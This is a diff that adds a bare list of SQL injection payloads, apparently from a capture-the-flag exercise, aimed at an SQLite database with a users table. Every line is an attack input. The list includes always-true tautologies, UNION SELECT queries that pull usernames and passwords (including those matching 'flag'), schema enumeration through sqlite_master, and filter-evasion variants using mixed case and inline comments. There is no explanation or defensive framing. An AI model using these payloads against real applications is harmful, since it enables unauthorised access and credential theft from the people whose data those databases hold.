@@ -1,0 +1,26 @@
+foo' UNION SELECT sqlite_version(), null, null --
+
+' OR '1'='1
+
+jim' AND password='foobar' OR username like 'flag%' AND '1'='1' LIMIT 100))--
+
+1984' UNION select username, password, null,null from users where username='' or '1'='1
+
+1984' UNION select username, password, null, null, null from users --
+
+' OR '1'='1' UNION SELECT null, null, null, (SELECT username from users where username like 'flag%')||':'||(SELECT password from users where username like 'flag%'), null --
+
+' OR '1'='1' UNION SELECT (SELECT username from users where username like 'flag%')||':'||(SELECT password from users WHERE username like 'flag%') from users --
+
+' UNION SELECT 1, (SELECT username from users where username like 'flag%')||':'||(SELECT password from users where username like 'flag%') from users --
+
+' UNION sElecT username, password, null, null, null from users--
+
+' union/**/select/**/username,password,null,null,null/**/from/**/users --
+
+' UNION SELECT username, password, null, null from ((SELECT tbl_name, null, null, null from sqlite_master where tbl_name like 'other%')) --
+
+blah'/**/AND/**/password='blah'unIoN/*a*/SeLeCT /**/username, password, null/**/from/**/users/**/where/**/username/**/NOT/**/like/**/'bob' --
+
+' OR '1'='1' LIMIT/**/5 --
+
